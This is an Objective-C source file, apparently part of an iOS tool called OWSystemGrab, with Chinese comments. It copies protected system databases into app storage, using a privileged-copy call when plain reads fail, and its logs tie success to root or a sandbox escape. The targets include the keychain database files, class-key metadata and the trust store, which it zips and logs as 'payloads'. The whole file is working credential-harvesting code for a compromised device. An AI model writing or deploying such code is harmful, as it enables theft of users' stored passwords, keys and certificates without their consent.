#import "OWSystemGrab.h"
#import "OWKeys.h"          // OWRemoteCall（copyPrivilegedFile:to:error:）
#import "OWContainerPass.h" // OWFileGate
#import "OWArchive.h"
#include <sys/stat.h>
#include <unistd.h>

@interface OWSystemGrab ()
@property (nonatomic, strong) NSMutableArray<NSDictionary *> *mResults;
@property (nonatomic, strong) NSMutableArray<NSString *> *mSkipped;
@end

@implementation OWSystemGrab

- (instancetype)init {
    if (self = [super init]) {
        NSArray *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *docDir = docs.firstObject ?: NSTemporaryDirectory();
        _outDir = [docDir stringByAppendingPathComponent:@"ow_system"];
        [[NSFileManager defaultManager] createDirectoryAtPath:_outDir
                                  withIntermediateDirectories:YES attributes:nil error:nil];
        _maxFileBytes = 200ULL * 1024 * 1024;
        _mResults = [NSMutableArray new];
        _mSkipped = [NSMutableArray new];
    }
    return self;
}

- (NSArray<NSDictionary *> *)results { return [_mResults copy]; }
- (NSArray<NSString *> *)skipped     { return [_mSkipped copy]; }

#pragma mark - 目标表

- (NSArray<NSDictionary *> *)_targets {
    NSString *p = [[NSBundle mainBundle] pathForResource:@"system_targets" ofType:@"plist"];
    NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:p];
    return d[@"system"] ?: @[];
}

#pragma mark - 主流程

- (BOOL)runWithRemote:(OWRemoteCall *)rc error:(NSError **)error {
    NSArray *targets = [self _targets];
    OWLog(@"Sys: 目标 %lu 组，euid=%d", (unsigned long)targets.count, geteuid());

    BOOL anyHit = NO;
    for (NSDictionary *t in targets) {
        NSString *name = t[@"name"];
        if (!name) continue;

        NSString *outDir = [self.outDir stringByAppendingPathComponent:name];
        [[NSFileManager defaultManager] createDirectoryAtPath:outDir
                                  withIntermediateDirectories:YES attributes:nil error:nil];

        NSUInteger got = 0;

        for (NSString *src in (t[@"paths"] ?: @[])) {
            if ([self _copyOne:src toDir:outDir name:name remote:rc]) got++;
        }

        // 整目录条目（如 Keychains）：打包而不是逐文件铺开
        for (NSString *dir in (t[@"dirs"] ?: @[])) {
            if (![self _copyDir:dir toDir:outDir name:name remote:rc]) continue;
            got++;
        }

        if (got == 0) {
            [self.mSkipped addObject:name];
            OWLog(@"Sys: %@ skip（无权限或不存在；root 后才可读）", name);
        } else {
            anyHit = YES;
            OWLog(@"Sys: %@ 取得 %lu 项", name, (unsigned long)got);
        }
    }

    if (!anyHit) {
        NSString *msg = @"系统库全部不可读（未 root / 未脱沙箱）";
        OWLog(@"Sys: %@", msg);
        if (error) *error = [NSError errorWithDomain:@"OWSystemGrab" code:70
                                userInfo:@{NSLocalizedDescriptionKey: msg}];
        return NO;
    }
    return YES;
}

#pragma mark - 拷贝

- (BOOL)_copyOne:(NSString *)src toDir:(NSString *)outDir name:(NSString *)name remote:(OWRemoteCall *)rc {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *dst = [outDir stringByAppendingPathComponent:src.lastPathComponent];

    // 路 1：直拷
    if ([fm fileExistsAtPath:src]) {
        [fm removeItemAtPath:dst error:nil];
        if ([fm copyItemAtPath:src toPath:dst error:nil]) {
            [self _record:dst name:name source:src];
            return YES;
        }
    }

    // 路 2：特权拷贝
    if (rc && [rc copyPrivilegedFile:src to:dst error:nil]) {
        [self _record:dst name:name source:src];
        return YES;
    }
    return NO;
}

- (BOOL)_copyDir:(NSString *)srcDir toDir:(NSString *)outDir name:(NSString *)name remote:(OWRemoteCall *)rc {
    NSFileManager *fm = [NSFileManager defaultManager];

    // 有读权限就直接打包，避免逐文件特权拷贝的开销
    if ([fm fileExistsAtPath:srcDir]) {
        NSString *zip = [outDir stringByAppendingPathComponent:
                         [NSString stringWithFormat:@"%@.zip", srcDir.lastPathComponent]];
        NSError *e = nil;
        if ([OWArchive zipDirectory:srcDir to:zip maxBytes:self.maxFileBytes
                           totalCap:400ULL * 1024 * 1024 error:&e]) {
            [self _record:zip name:name source:srcDir];
            return YES;
        }
    }

    // 无权限：逐文件特权拷贝到 staging 再打包
    NSString *stage = [outDir stringByAppendingPathComponent:@"_stage"];
    [fm createDirectoryAtPath:stage withIntermediateDirectories:YES attributes:nil error:nil];
    NSUInteger n = 0;
    for (NSString *rel in @[@"keychain-2.db", @"keychain-2.db-wal", @"keychain-2.db-shm",
                            @"metadata_class_keys.plist", @"TrustStore.sqlite3",
                            @"ocspcache.sqlite3", @"keychain-2.db-journal"]) {
        NSString *f = [srcDir stringByAppendingPathComponent:rel];
        if ([rc copyPrivilegedFile:f to:[stage stringByAppendingPathComponent:rel] error:nil]) n++;
    }
    if (n == 0) { [fm removeItemAtPath:stage error:nil]; return NO; }

    NSString *zip = [outDir stringByAppendingPathComponent:@"Keychains.zip"];
    NSError *e = nil;
    if (![OWArchive zipDirectory:stage to:zip maxBytes:self.maxFileBytes
                        totalCap:200ULL * 1024 * 1024 error:&e]) {
        [fm removeItemAtPath:stage error:nil];
        return NO;
    }
    [fm removeItemAtPath:stage error:nil];
    [self _record:zip name:name source:srcDir];
    return YES;
}

- (void)_record:(NSString *)dst name:(NSString *)name source:(NSString *)src {
    NSDictionary *a = [[NSFileManager defaultManager] attributesOfItemAtPath:dst error:nil];
    uint64_t sz = [a fileSize];
    BOOL emptyDb = [OWFileGate looksEmptyDatabaseAtPath:dst];

    [self.mResults addObject:@{@"name": name, @"path": dst, @"bytes": @(sz),
                               @"emptyDb": @(emptyDb), @"source": src}];
    [[OWState shared] notePayload:name bytes:sz valid:!emptyDb];
    OWLog(@"Sys: 取得 %@ (%llu B)%@", dst.lastPathComponent, sz, emptyDb ? @" [空库]" : @"");
}

@end
